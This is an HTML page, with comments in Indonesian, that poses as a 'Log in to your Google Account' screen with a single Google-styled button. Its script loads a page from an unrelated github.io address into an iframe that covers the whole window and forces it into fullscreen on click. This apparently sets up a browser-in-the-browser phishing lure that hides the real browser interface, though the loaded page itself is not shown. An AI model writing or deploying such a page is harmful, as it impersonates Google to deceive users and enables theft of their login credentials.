<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log in to your Google Account</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f5f5f5;
      font-family: Arial, sans-serif;
    }
    .btn {
      background-color: #1a73e8;
      color: #ffffff;
      border: none;
      padding: 14px 28px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    .btn:hover {
      background-color: #1666cc;
    }
    iframe.fs {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      border: 0;
      z-index: 9999;
      background: #fff;
    }
  </style>
</head>
<body>
  <button class="btn" id="loginBtn">Log in to your Google Account</button>

  <script>
    document.getElementById('loginBtn').addEventListener('click', function () {
      // 1) Buat iframe yang memuat bar.html
      const iframe = document.createElement('iframe');
      iframe.className = 'fs';
      iframe.src = 'https://mwishal.github.io/bar/bar.html';
      iframe.allow = 'fullscreen';
      document.body.appendChild(iframe);

      // 2) Masukkan iframe ke fullscreen — masih dalam "user gesture" dari klik
      const req =
        iframe.requestFullscreen ||
        iframe.webkitRequestFullscreen ||
        iframe.msRequestFullscreen;

      if (req) {
        req.call(iframe).catch((err) => {
          console.warn('Fullscreen ditolak:', err);
        });
      }
    });
  </script>
</body>
</html>
